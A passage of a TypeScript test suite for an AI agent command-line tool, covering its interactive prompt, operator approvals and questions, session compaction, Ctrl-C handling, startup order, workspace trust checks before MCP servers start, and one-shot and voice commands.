    });

    expect(exitCode).toBe(0);
    expect(fake.getResolved()).toEqual([{ decision: "approved", requestId: "approval.piped" }]);
  });

  test("answers an agent question directly and threads the reply as the resolution comment", async () => {
    const fake = createFakeSdk({
      pendingApprovals: [
        {
          justification: "Which database should I target?",
          kind: "question",
          label: "Ask User Question",
          options: [{ description: "Local dev database", label: "sqlite" }, { label: "postgres" }],
          requestId: "approval.7",
          value: "ask_user_question"
        }
      ]
    });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["set up the db", "postgres", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(capture.getStdout()).toContain("The agent asks: Which database should I target?");
    expect(capture.getStdout()).toContain("  1) sqlite — Local dev database");
    expect(capture.getStdout()).toContain("  2) postgres");
    // Free text is always allowed; the prompt says so instead of offering a
    // separate "other" choice the operator would have to select first.
    expect(capture.getStdout()).toContain("number, or type your own answer");
    expect(capture.getStdout()).not.toContain("[y/N/a/e]");
    expect(fake.getResolved()).toEqual([{ comment: "postgres", decision: "approved", requestId: "approval.7" }]);
    expect(capture.getStdout()).toContain("Answer sent to the agent.");
  });

  test("resolves a numbered question answer to the option label", async () => {
    const fake = createFakeSdk({
      pendingApprovals: [
        {
          justification: "Which database should I target?",
          kind: "question",
          label: "Ask User Question",
          options: [{ description: "Local dev database", label: "sqlite" }, { label: "postgres" }],
          requestId: "approval.8",
          value: "ask_user_question"
        }
      ]
    });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["set up the db", "2", "/exit"])
    });

    expect(exitCode).toBe(0);
    // Numbering is a CLI convenience; the tool only ever sees the label, so
    // ask_user_question can still report matchedOption correctly.
    expect(fake.getResolved()).toEqual([{ comment: "postgres", decision: "approved", requestId: "approval.8" }]);
  });

  test("/compact summarizes the session through the SDK and reports the result", async () => {
    const fake = createFakeSdk({
      compactResult: { hiddenMessageCount: 6, summaryPath: "/tmp/chat-session-memory/session.md" }
    });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["hello", "/compact", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(fake.getCompactCalls()).toBe(1);
    expect(capture.getStdout()).toContain("Compacted 6 earlier message(s) into a session summary.");
    expect(capture.getStdout()).toContain("Summary file: /tmp/chat-session-memory/session.md");
    // /compact is a REPL command, never sent to the agent as a message.
    expect(fake.getSent()).toEqual(["hello"]);
  });

  test("/compact reports an empty session and surfaces gateway errors without leaving the loop", async () => {
    const empty = createFakeSdk({ compactResult: { hiddenMessageCount: 0 } });
    const emptyCapture = createCaptureStreams();
    expect(
      await runCliWithStubbedEndpoint([], emptyCapture.streams, {
        createSdk: async () => empty.sdk,
        interactiveInput: lineSource(["/compact", "/exit"])
      })
    ).toBe(0);
    expect(emptyCapture.getStdout()).toContain("Nothing to compact yet");

    const failing = createFakeSdk({ compactError: "Session has pending approvals" });
    const failingCapture = createCaptureStreams();
    expect(
      await runCliWithStubbedEndpoint([], failingCapture.streams, {
        createSdk: async () => failing.sdk,
        interactiveInput: lineSource(["/compact", "still here", "/exit"])
      })
    ).toBe(0);
    expect(failingCapture.getStderr()).toContain("Failed to compact the session: Session has pending approvals");
    expect(failing.getSent()).toEqual(["still here"]);
  });

  test("treats /quit as an exit alias", async () => {
    const fake = createFakeSdk();
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["/quit"])
    });

    expect(exitCode).toBe(0);
    expect(fake.getSent()).toEqual([]);
    expect(fake.wasClosed()).toBe(true);
  });

  test("shows help and reports unknown commands without leaving the loop", async () => {
    const fake = createFakeSdk();
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["/help", "/bogus", "real message", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(capture.getStdout()).toContain("Interactive commands:");
    expect(capture.getStdout()).toContain("/compact");
    // Every answer the approval prompt takes. `e` was missing, while the text
    // described a denial "note" without saying how to attach one.
    for (const answer of ["y", "a", "e", "N"]) {
      expect(capture.getStdout()).toMatch(new RegExp(`^  ${answer}  \\S`, "mu"));
    }
    expect(capture.getStderr()).toContain('Unknown command "/bogus"');
    expect(fake.getSent()).toEqual(["real message"]);
  });

  test("skips blank input and exits cleanly when the input stream ends", async () => {
    const fake = createFakeSdk();
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["   ", "only message"])
    });

    expect(exitCode).toBe(0);
    expect(fake.getSent()).toEqual(["only message"]);
    expect(fake.wasClosed()).toBe(true);
  });

  test("surfaces a session error to stderr but keeps the loop alive", async () => {
    const fake = createFakeSdk({ lastError: "model exploded" });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["trigger", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(capture.getStderr()).toContain("Error: model exploded");
    expect(capture.getStdout()).toContain("Goodbye.");
  });

  // A prompt-compliant model puts its answer in `attempt_complete`'s `summary`
  // and sends no chat message, so nothing streams. Without this the operator
  // watched a turn produce reasoning, a status line, and no answer at all.
  test("prints the accepted completion summary so the answer reaches the operator", async () => {
    const fake = createFakeSdk({ completionSummary: "17 * 23 = 391." });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["what is 17 * 23?", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(capture.getStdout()).toContain("17 * 23 = 391.");
  });
});

function createPromptSdk(
  options: { assistant?: string; lastError?: string; status?: string; throwOnCreate?: boolean } = {}
): {
  sdk: AIAgentSdk;
  wasClosed: () => boolean;
} {
  let closed = false;
  const snapshot = {
    snapshot: {
      messages: options.assistant ? [{ parts: [{ kind: "text", text: options.assistant }], role: "assistant" }] : [],
      session: {
        goal: "do the thing",
        id: "session.prompt.1",
        lastError: options.lastError ? { message: options.lastError } : undefined,
        status: options.status ?? "completed"
      }
    },
    taskState: null
  } as unknown as GatewaySessionSnapshot;

  const sdk = {
    close: async () => {
      closed = true;
    },
    sessions: {
      create: async () => {
        if (options.throwOnCreate) {
          throw new Error("session create exploded");
        }
        return {
          handle: { snapshot: async () => snapshot },
          run: { wait: async () => ({ id: "run.prompt.1" }) },
          session: { goal: "do the thing", id: "session.prompt.1" }
        };
      }
    }
  } as unknown as AIAgentSdk;

  return { sdk, wasClosed: () => closed };
}

// At a terminal the prompt comes up as soon as the config is read, and the
// rest of startup (MCP servers, memory, the model check, the session) runs
// behind it. Scripted input keeps the old order; see the tests above.
describe("interactive CLI at a terminal", () => {
  // Hermetic: a terminal REPL reads the workspace config and asks about trust
  // before anything starts, so these runs get an empty workspace and home of
  // their own instead of this repository's aia.config.jsonc (which declares an
  // MCP server) and the developer's ~/.aia (where a "y" would grant trust).
  let terminalRoot = "";
  beforeEach(async () => {
    terminalRoot = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "aiagent-cli-terminal-")));
    await fs.mkdir(path.join(terminalRoot, "workspace", ".git"), { recursive: true });
    await fs.mkdir(path.join(terminalRoot, "home"), { recursive: true });
  });
  afterEach(async () => {
    await fs.rm(terminalRoot, { force: true, recursive: true });
  });
  const terminalWorkspace = () => path.join(terminalRoot, "workspace");
  const terminalHome = () => path.join(terminalRoot, "home");
  const runTerminalCli = (streams: CaptureStreams, deps: Parameters<typeof runCli>[2] = {}) =>
    runCliWithStubbedEndpoint(["--cwd", terminalWorkspace()], streams, { userHomeDirectory: terminalHome(), ...deps });

  test("shows the prompt before startup finishes and sends a message typed meanwhile once it is ready", async () => {
    const fake = createFakeSdk();
    const startup = createGate();
    const capture = createCaptureStreams();
    const reader = createBufferedTestReader([], { interactive: true });

    const done = runTerminalCli(capture.streams, {
      createSdk: async () => {
        await startup.wait;
        return fake.sdk;
      },
      interactiveInput: reader
    });

    await waitUntil(() => capture.getStdout().includes("› "));
    expect(capture.getStdout()).toContain("AIAgent interactive session.");
    expect(capture.getStdout()).not.toContain("Session:");

    await reader.type("hello early");
    await waitUntil(() =>
      capture.getStderr().includes("Still starting up. This is sent as soon as the session is ready.")
    );
    expect(fake.getSent()).toEqual([]);

    startup.open();
    await waitUntil(() => fake.getSent().length === 1);
    const stdout = capture.getStdout();
    expect(stdout).toContain("Session: session.test.cli.1");
    expect(stdout.indexOf("Session: session.test.cli.1")).toBeLessThan(stdout.indexOf("echo: hello early"));
    expect(capture.getStderr()).toContain("· Sending: hello early");

    await reader.type("/exit");
    expect(await done).toBe(0);
    expect(fake.wasClosed()).toBe(true);
  });

  // The 2026-10-02 report: a message pasted during startup and not yet sent.
  // When startup finished, the session line printed after the pasted text and
  // an empty prompt followed, so it looked sent and ignored. At a terminal the
  // output now goes above the prompt and the text waits there for Enter.
  test("at a terminal, startup finishing while a message is half typed prints above it and keeps it", async () => {
    const fake = createFakeSdk();
    const startup = createGate();
    const terminal = createFakeTerminal({ columns: 100 });
    const write = (value: string) => terminal.output.write(value);
    const screenEndsWith = async (text: string) => (await terminal.screenText()).endsWith(text);

    const done = runTerminalCli(
      { stderr: { write }, stdout: { write } },
      {
        createSdk: async () => {
          await startup.wait;
          return fake.sdk;
        },
        interactiveInput: terminal.lines
      }
    );

    await waitUntilAsync(() => screenEndsWith("› "));
    await terminal.type("please help me add two MCP servers");
    startup.open();
    await waitUntilAsync(async () => (await terminal.screenText()).includes("Session: session.test.cli.1"));

    const screen = (await terminal.screenText()).split("\n");
    expect(screen.slice(-2)).toEqual(["Session: session.test.cli.1", "› please help me add two MCP servers"]);
    expect(fake.getSent()).toEqual([]);

    await terminal.type("\r");
    await waitUntil(() => fake.getSent().length === 1);
    expect(fake.getSent()).toEqual(["please help me add two MCP servers"]);

    await waitUntilAsync(() => screenEndsWith("› "));
    await terminal.type("/exit\r");
    expect(await done).toBe(0);
  });

  test("answers /help while starting up, and holds other commands until the session is ready", async () => {
    const fake = createFakeSdk({ compactResult: { hiddenMessageCount: 0 } });
    const startup = createGate();
    const capture = createCaptureStreams();
    const reader = createBufferedTestReader([], { interactive: true });

    const done = runTerminalCli(capture.streams, {
      createSdk: async () => {
        await startup.wait;
        return fake.sdk;
      },
      interactiveInput: reader
    });

    await waitUntil(() => capture.getStdout().includes("› "));
    await reader.type("/help");
    await waitUntil(() => capture.getStdout().includes("Interactive commands:"));
    await reader.type("/compact");
    await waitUntil(() => capture.getStderr().includes("This runs as soon as the session is ready."));
    expect(fake.getCompactCalls()).toBe(0);

    startup.open();
    await waitUntil(() => fake.getCompactCalls() === 1);
    await reader.type("/exit");
    expect(await done).toBe(0);
  });

  test("/exit during startup leaves without creating a session and prints what was not sent", async () => {
    const fake = createFakeSdk();
    const startup = createGate();
    const capture = createCaptureStreams();
    const reader = createBufferedTestReader([], { interactive: true });

    const done = runTerminalCli(capture.streams, {
      createSdk: async () => {
        await startup.wait;
        return fake.sdk;
      },
      interactiveInput: reader
    });

    await waitUntil(() => capture.getStdout().includes("› "));
    await reader.type("hello early");
    await reader.type("/exit");
    await waitUntil(() => capture.getStdout().includes("Goodbye."));
    expect(capture.getStderr()).toContain("Not sent:\n  hello early");

    // Leaving still waits for startup to settle, then closes what it opened.
    startup.open();
    expect(await done).toBe(0);
    expect(fake.getCreateCalls()).toBe(0);
    expect(fake.getSent()).toEqual([]);
    expect(fake.wasClosed()).toBe(true);
  });

  test("a startup failure after typing prints the error and what was not sent", async () => {
    const startup = createGate();
    const capture = createCaptureStreams();
    const reader = createBufferedTestReader([], { interactive: true });

    const done = runTerminalCli(capture.streams, {
      createSdk: async () => {
        await startup.wait;
        throw new Error("runtime boot exploded");
      },
      interactiveInput: reader
    });

    await waitUntil(() => capture.getStdout().includes("› "));
    await reader.type("hello early");
    startup.open();

    expect(await done).toBe(1);
    expect(capture.getStderr()).toContain("Failed to start AIAgent: runtime boot exploded");
    expect(capture.getStderr()).toContain("Not sent:\n  hello early");
  });

  test("an unreachable model at startup is a startup failure", async () => {
    const fake = createFakeSdk({ modelStatus: "unavailable" });
    const capture = createCaptureStreams();
    const reader = createBufferedTestReader([], { interactive: true });

    const exitCode = await runTerminalCli(capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: reader
    });

    expect(exitCode).toBe(1);
    expect(capture.getStderr()).toContain("the chat model provider");
    expect(fake.getCreateCalls()).toBe(0);
    expect(fake.wasClosed()).toBe(true);
  });

  // A llama.cpp server still loading its model answers /health with 503, which
  // the adapter reports as degraded. The REPL starts and says the first reply
  // will wait, rather than refusing to start as it does for "unavailable".
  test("a provider that is up but not ready starts the session with a notice", async () => {
    const fake = createFakeSdk({ modelStatus: "degraded" });
    const capture = createCaptureStreams();
    const reader = createBufferedTestReader([], { interactive: true });

    const done = runTerminalCli(capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: reader
    });

    await waitUntil(() => capture.getStdout().includes("Session: "));
    expect(capture.getStderr()).toContain("is up but not ready yet");
    expect(fake.getCreateCalls()).toBe(1);

    await reader.type("/exit");
    expect(await done).toBe(0);
  });

  test("Ctrl-C at the prompt exits after cleaning up", async () => {
    const fake = createFakeSdk();
    const capture = createCaptureStreams();
    const interrupts = createInterruptSource();

    const done = runTerminalCli(capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: createBufferedTestReader([], { interactive: true }),
      interrupts: interrupts.source
    });

    await waitUntil(() => capture.getStdout().includes("Session: session.test.cli.1"));
    interrupts.fire();

    expect(await done).toBe(130);
    expect(capture.getStdout()).toContain("Goodbye.");
    expect(fake.wasClosed()).toBe(true);
  });

  test("the first Ctrl-C cancels the running turn and the REPL carries on", async () => {
    const fake = createFakeSdk({ runBlocksUntilCancel: true });
    const capture = createCaptureStreams();
    const interrupts = createInterruptSource();
    const reader = createBufferedTestReader([], { interactive: true });

    const done = runTerminalCli(capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: reader,
      interrupts: interrupts.source
    });

    await waitUntil(() => capture.getStdout().includes("Session: session.test.cli.1"));
    await reader.type("keep generating");
    await waitUntil(() => capture.getStdout().includes("Thinking…"));
    interrupts.fire();

    await waitUntil(() => capture.getStderr().includes("Turn ended: the run was cancelled"));
    expect(fake.getCancelCalls()).toBe(1);
    expect(capture.getStderr()).toContain("Cancelling the turn. Press Ctrl-C again to exit.");

    await reader.type("/exit");
    expect(await done).toBe(0);
  });

  test("a second Ctrl-C while the turn is still cancelling exits", async () => {
    const fake = createFakeSdk({ cancelEndsRun: false, runBlocksUntilCancel: true });
    const capture = createCaptureStreams();
    const interrupts = createInterruptSource();
    const reader = createBufferedTestReader([], { interactive: true });

    const done = runTerminalCli(capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: reader,
      interrupts: interrupts.source
    });

    await waitUntil(() => capture.getStdout().includes("Session: session.test.cli.1"));
    await reader.type("keep generating");
    await waitUntil(() => capture.getStdout().includes("Thinking…"));
    interrupts.fire();
    await waitUntil(() => fake.getCancelCalls() === 1);
    interrupts.fire();

    expect(await done).toBe(130);
    expect(capture.getStdout()).toContain("Goodbye.");
    expect(fake.wasClosed()).toBe(true);
  });

  test("Ctrl-C at an approval prompt cancels the approvals and resumes nothing", async () => {
    const fake = createFakeSdk({
      pendingApprovals: [{ label: "Write File", requestId: "approval.ctrl-c", value: "write_file" }]
    });
    const capture = createCaptureStreams();
    const interrupts = createInterruptSource();
    const reader = createBufferedTestReader([], { interactive: true });

    const done = runTerminalCli(capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: reader,
      interrupts: interrupts.source
    });

    await waitUntil(() => capture.getStdout().includes("Session: session.test.cli.1"));
    await reader.type("write a file");
    await waitUntil(() => capture.getStdout().includes("Approve Write File → write_file?"));
    interrupts.fire();

    await waitUntil(() => capture.getStderr().includes("Turn cancelled."));
    expect(fake.getResolved()).toEqual([
      { comment: "Cancelled by the operator (Ctrl-C).", decision: "cancelled", requestId: "approval.ctrl-c" }
    ]);
    expect(fake.getResumeCalls()).toBe(0);
    expect(capture.getStderr()).toContain("The pending approval was cancelled, so nothing it asked for ran.");

    await reader.type("/exit");
    expect(await done).toBe(0);
  });

  test("a warning that arrives while the prompt is showing gets its own line, then the prompt comes back", async () => {
    // Node installs no printer under --no-warnings, and then neither does the REPL.
    if (process.rawListeners("warning").length === 0) {
      return;
    }
    const fake = createFakeSdk();
    const capture = createCaptureStreams();
    const reader = createBufferedTestReader([], { interactive: true });

    const done = runTerminalCli(capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: reader
    });

    await waitUntil(() => capture.getStdout().endsWith("Session: session.test.cli.1\n› "));
    process.emitWarning("the disk is slow", { code: "AIA_TEST_REPL_WARNING" });
    await waitUntil(() => capture.getStderr().includes("[AIA_TEST_REPL_WARNING] Warning: the disk is slow"));
    expect(capture.getStdout().endsWith("› \n› ")).toBe(true);

    await reader.type("/exit");
    expect(await done).toBe(0);
  });

  // An MCP server's question is asked mid-turn, on the same stdin as the chat.
  describe("MCP questions mid-turn", () => {
    const question = (id = "approval.elicitation.1") => ({
      payload: {
        createdAt: "2026-10-13T12:00:00.000Z",
        id,
        justification: 'The MCP server "tools" asks: Who is deploying?',
        metadata: { interaction: "elicitation", mcpServer: "tools", options: [] },
        sessionId: "session.test.cli.1",
        status: "pending",
        target: { kind: "question", label: "MCP tools", value: "tools" },
        turnId: "turn.1"
      },
      topic: "approval.requested"
    });
    const resolution = (decision: string, requestId = "approval.elicitation.1") => ({
      payload: {
        actor: decision === "expired" ? "system" : "web",
        decidedAt: "2026-10-13T12:00:05.000Z",
        decision,
        id: `resolution.${requestId}`,
        metadata: {},
        requestId
      },
      topic: "approval.resolved"
    });
    const startTurn = async (fake: ReturnType<typeof createFakeSdk>) => {
      const capture = createCaptureStreams();
      const reader = createBufferedTestReader([], { interactive: true });
      const done = runTerminalCli(capture.streams, { createSdk: async () => fake.sdk, interactiveInput: reader });
      await waitUntil(() => capture.getStdout().includes("Session: session.test.cli.1"));
      await reader.type("deploy it");
      await waitUntil(() => capture.getStdout().includes("Thinking…"));
      fake.emit(question());
      await waitUntil(() => capture.getStdout().includes("Your answer (Enter to skip): "));
      return { capture, done, reader };
    };

    // Its read used to stay pending: the next line went to the chat and to
    // the dead question, whose answer the gateway then refused, unhandled.
    test("a question answered elsewhere stops waiting, and the next line goes only to the chat", async () => {
      const fake = createFakeSdk({ runBlocksUntilCancel: true });
      const { capture, done, reader } = await startTurn(fake);

      fake.emit(resolution("approved"));
      await waitUntil(() => capture.getStderr().includes("The MCP server's question was answered elsewhere."));
      fake.finishRun();
      await waitUntil(() => capture.getStdout().endsWith("› "));
      await reader.type("next request");
      await waitUntil(() => fake.getSent().length === 2);

      expect(fake.getSent()).toEqual(["deploy it", "next request"]);
      expect(fake.getResolved()).toEqual([]);
      fake.finishRun();
      await waitUntil(() => capture.getStdout().endsWith("› "));
      await reader.type("/exit");
      expect(await done).toBe(0);
    });

    test("an expired question says so, and one its turn outlived stops waiting too", async () => {
      const fake = createFakeSdk({ runBlocksUntilCancel: true });
      const { capture, done, reader } = await startTurn(fake);
      fake.emit(resolution("expired"));
      await waitUntil(() => capture.getStderr().includes("The MCP server's question expired."));

      // A second question, still open when the run ends.
      fake.emit(question("approval.elicitation.2"));
      await waitUntil(() => capture.getStdout().split("Your answer (Enter to skip): ").length === 3);
      fake.finishRun();
      await waitUntil(() => capture.getStdout().endsWith("› "));
      await reader.type("next request");
      await waitUntil(() => fake.getSent().length === 2);
      expect(fake.getResolved()).toEqual([]);

      fake.finishRun();
      await waitUntil(() => capture.getStdout().endsWith("› "));
      await reader.type("/exit");
      expect(await done).toBe(0);
    });

    test("Ctrl-C at a question cancels it, and its own resolution is not taken for one from elsewhere", async () => {
      const fake = createFakeSdk({ emitResolutions: true, runBlocksUntilCancel: true });
      const capture = createCaptureStreams();
      const interrupts = createInterruptSource();
      const reader = createBufferedTestReader([], { interactive: true });
      const done = runTerminalCli(capture.streams, {
        createSdk: async () => fake.sdk,
        interactiveInput: reader,
        interrupts: interrupts.source
      });
      await waitUntil(() => capture.getStdout().includes("Session: session.test.cli.1"));
      await reader.type("deploy it");
      await waitUntil(() => capture.getStdout().includes("Thinking…"));
      fake.emit(question());
      await waitUntil(() => capture.getStdout().includes("Your answer (Enter to skip): "));

      interrupts.fire();
      await waitUntil(() => fake.getResolved().length === 1);
      expect(fake.getResolved()).toEqual([{ decision: "cancelled", requestId: "approval.elicitation.1" }]);
      await waitUntil(() => capture.getStdout().endsWith("› "));
      expect(capture.getStderr()).not.toContain("answered elsewhere");

      await reader.type("/exit");
      expect(await done).toBe(0);
    });

    test("an answer too long to send is asked for again", async () => {
      const fake = createFakeSdk({ runBlocksUntilCancel: true });
      const { capture, done, reader } = await startTurn(fake);

      await reader.type("x".repeat(2_001));
      await waitUntil(() =>
        capture.getStdout().includes("That answer is 2,001 characters; at most 2,000 fit. Try a shorter one.")
      );
      await reader.type("Ada");
      await waitUntil(() => fake.getResolved().length === 1);
      expect(fake.getResolved()).toEqual([
        { comment: "Ada", decision: "approved", requestId: "approval.elicitation.1" }
      ]);

      fake.finishRun();
      await waitUntil(() => capture.getStdout().endsWith("› "));
      await reader.type("/exit");
      expect(await done).toBe(0);
    });

    test("an answer the gateway refuses is reported, and the REPL carries on", async () => {
      const fake = createFakeSdk({ resolveError: "not_found: approval.elicitation.1", runBlocksUntilCancel: true });
      const { capture, done, reader } = await startTurn(fake);

      await reader.type("Ada");
      await waitUntil(() => capture.getStderr().includes("The answer was not sent: not_found: approval.elicitation.1"));
      fake.finishRun();
      await waitUntil(() => capture.getStdout().endsWith("› "));
      await reader.type("/exit");
      expect(await done).toBe(0);
    });
  });

  // Security review M11: a workspace config's MCP servers start only once the
  // operator has trusted that exact file. At a terminal the REPL asks first.
  const writeWorkspaceMcpConfig = async (): Promise<string> => {
    const configPath = path.join(terminalWorkspace(), "aia.config.jsonc");
    await fs.writeFile(
      configPath,
      JSON.stringify({
        configVersion: 1,
        mcp: {
          servers: {
            docs: { args: ["server.mjs"], command: "node", enabled: true, required: false, tags: [], type: "stdio" }
          }
        }
      }),
      "utf8"
    );
    return configPath;
  };

  test("asks whether to trust a workspace config that declares MCP servers, and starts them after a yes", async () => {
    const configPath = await writeWorkspaceMcpConfig();
    const fake = createFakeSdk();
    const capture = createCaptureStreams();
    const reader = createBufferedTestReader([], { interactive: true });
    let started: LoadedAIAgentConfig | undefined;

    const done = runTerminalCli(capture.streams, {
      createSdk: async ({ loaded }) => {
        started = loaded;
        return fake.sdk;
      },
      interactiveInput: reader
    });

    await waitUntil(() => capture.getStdout().includes("Trust this exact file? [y/N] "));
    expect(capture.getStdout()).toContain(`Not trusted: ${configPath}`);
    expect(capture.getStdout()).toContain("Trusting this exact file would allow:");
    expect(capture.getStdout()).toContain("  - MCP server docs: runs node server.mjs");
    // Nothing starts before the answer.
    expect(started).toBeUndefined();

    await reader.type("y");
    await waitUntil(() => capture.getStdout().includes("› "));
    expect(capture.getStdout()).toContain(`Trusted ${configPath}.`);
    expect(started?.workspaceTrust.trusted).toBe(true);
    expect(Object.keys(started?.resolvedConfig.mcp.servers ?? {})).toContain("docs");
    const store = JSON.parse(await fs.readFile(path.join(terminalHome(), ".aia", "trust.json"), "utf8")) as {
      trustedConfigs: Array<{ path: string }>;
    };
    expect(store.trustedConfigs.map((entry) => entry.path)).toEqual([configPath]);

    await reader.type("/exit");
    expect(await done).toBe(0);
  });

  test("anything but yes keeps the workspace MCP servers from starting", async () => {
    await writeWorkspaceMcpConfig();
    const fake = createFakeSdk();
    const capture = createCaptureStreams();
    const reader = createBufferedTestReader([], { interactive: true });
    let started: LoadedAIAgentConfig | undefined;

    const done = runTerminalCli(capture.streams, {
      createSdk: async ({ loaded }) => {
        started = loaded;
        return fake.sdk;
      },
      interactiveInput: reader
    });

    await waitUntil(() => capture.getStdout().includes("Trust this exact file? [y/N] "));
    await reader.type("");
    await waitUntil(() => capture.getStdout().includes("› "));
    expect(capture.getStdout()).toContain("Not trusted; continuing without MCP server docs.");
    expect(started?.workspaceTrust.trusted).toBe(false);
    expect(started?.resolvedConfig.mcp.servers.docs).toBeUndefined();
    expect(started?.workspaceTrust.untrustedMcpEntries.map((entry) => entry.name)).toEqual(["docs"]);
    await expect(fs.access(path.join(terminalHome(), ".aia", "trust.json"))).rejects.toThrow();

    await reader.type("/exit");
    expect(await done).toBe(0);
  });

  // A yes that cannot be recorded (a trust store aia cannot safely rewrite)
  // used to end startup with an error; it now starts untrusted, as a no would.
  test("starts untrusted, saying why, when a yes cannot be recorded", async () => {
    await writeWorkspaceMcpConfig();
    const storePath = path.join(terminalHome(), ".aia", "trust.json");
    const damaged = '{ "trustedConfigs": [], "version": 1, "note": "added by hand" }';
    await fs.mkdir(path.dirname(storePath), { recursive: true });
    await fs.writeFile(storePath, damaged, "utf8");
    const fake = createFakeSdk();
    const capture = createCaptureStreams();
    const reader = createBufferedTestReader([], { interactive: true });
    let started: LoadedAIAgentConfig | undefined;

    const done = runTerminalCli(capture.streams, {
      createSdk: async ({ loaded }) => {
        started = loaded;
        return fake.sdk;
      },
      interactiveInput: reader
    });

    await waitUntil(() => capture.getStdout().includes("Trust this exact file? [y/N] "));
    await reader.type("y");
    await waitUntil(() => capture.getStdout().includes("› "));
    expect(capture.getStderr()).toContain("Could not record trust:");
    expect(capture.getStdout()).toContain("Not trusted; continuing without MCP server docs.");
    expect(started?.workspaceTrust.trusted).toBe(false);
    await expect(fs.readFile(storePath, "utf8")).resolves.toBe(damaged);

    await reader.type("/exit");
    expect(await done).toBe(0);
  });
});

describe("CLI help, voice help, and one-shot prompt", () => {
  test("prints top-level help", async () => {
    const capture = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(["--help"], capture.streams, {});
    expect(exitCode).toBe(0);
    expect(capture.getStdout()).toContain("Available commands:");
  });

  test("prints voice help for --help and a bare voice command", async () => {
    const help = createCaptureStreams();
    expect(await runCliWithStubbedEndpoint(["voice", "--help"], help.streams, {})).toBe(0);
    expect(help.getStdout().toLowerCase()).toContain("voice");

    const bare = createCaptureStreams();
    expect(await runCliWithStubbedEndpoint(["voice"], bare.streams, {})).toBe(0);
    expect(bare.getStdout().toLowerCase()).toContain("voice");
  });

  test("reports an unknown voice subcommand", async () => {
    const capture = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(["voice", "teleport"], capture.streams, {});
    expect(exitCode).toBe(1);
    expect(capture.getStderr()).toContain("Unknown voice subcommand: teleport");
  });

  test("runs a one-shot --prompt session and prints the assistant summary", async () => {
    const fake = createPromptSdk({ assistant: "All done." });
    const capture = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(["--prompt", "do the thing"], capture.streams, {
      createSdk: async () => fake.sdk
    });
    expect(exitCode).toBe(0);
    expect(capture.getStdout()).toContain("Assistant: All done.");
    expect(capture.getStdout()).toContain("Status: completed");
    expect(capture.getStdout()).toContain("Run: run.prompt.1");
    expect(fake.wasClosed()).toBe(true);
  });

  test("returns a non-zero exit and surfaces session errors for an unfinished prompt run", async () => {
    const fake = createPromptSdk({ lastError: "ran out of fuel", status: "failed" });
    const capture = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(["--prompt", "do the thing"], capture.streams, {
      createSdk: async () => fake.sdk
    });
    expect(exitCode).toBe(1);
    expect(capture.getStdout()).toContain("Error: ran out of fuel");
  });

  test("surfaces a failure when the prompt session cannot be created", async () => {
    const fake = createPromptSdk({ throwOnCreate: true });
    const capture = createCaptureStreams();
    const exitCode = await runCliWithStubbedEndpoint(["--prompt", "do the thing"], capture.streams, {
      createSdk: async () => fake.sdk
    });
    expect(exitCode).toBe(1);
    expect(capture.getStderr()).toContain("exploded");
    expect(fake.wasClosed()).toBe(true);
  });
});

const voiceTempRoots: string[] = [];

afterEach(async () => {
  await Promise.all(voiceTempRoots.splice(0).map((root) => fs.rm(root, { force: true, recursive: true })));
});

function audioArtifact(uri = "file:///tmp/out.aiff"): ArtifactReference {
  return {
    byteLength: 8,
    id: "artifact.voice.cli",
    kind: "audio",
    mediaType: "audio/aiff",
    metadata: { durationMs: 1000 },
    name: "out.aiff",
    sha256: "a".repeat(64),
    uri
  };
}

function fakeSessions(): FileSessionStore {
  const session = {
    createdAt: "2026-06-11T00:00:00.000Z",
    cwd: "/workspace",
    goal: "voice",
    id: "session.voice.cli",
    lastActiveAt: "2026-06-11T00:00:00.000Z",
    metadata: {},
    status: "idle",
    tags: [],
    title: "Voice",
    updatedAt: "2026-06-11T00:00:00.000Z"
  } as unknown as SessionRecord;
  return {
    appendMessages: async () => undefined,
    getSession: async () => session,
    saveSession: async () => undefined
  } as unknown as FileSessionStore;
}

function fakeVoiceService(overrides: Partial<VoiceService> = {}): VoiceService {
  return {
    dispose: async () => undefined,
    getCapture: async () => null,
    listDevices: async () => [
      { default: true, id: "spk", kind: "output", metadata: {}, name: "Speaker", providerId: "local_system" }
    ],
    listProviderHealth: async () => [],
    listVoices: async () => [
      { default: true, displayName: "Alex", id: "Alex", locale: "en-US", metadata: {}, providerId: "local_system" }
    ],
    playback: async () => ({
      id: "playback.1",
      metadata: {},
      providerId: "local_system",
      startedAt: "x",
      status: "completed"
    }),
    startCapture: async () => ({
      id: "capture.1",
      metadata: {},
      providerId: "apple_native",
      startedAt: "x",
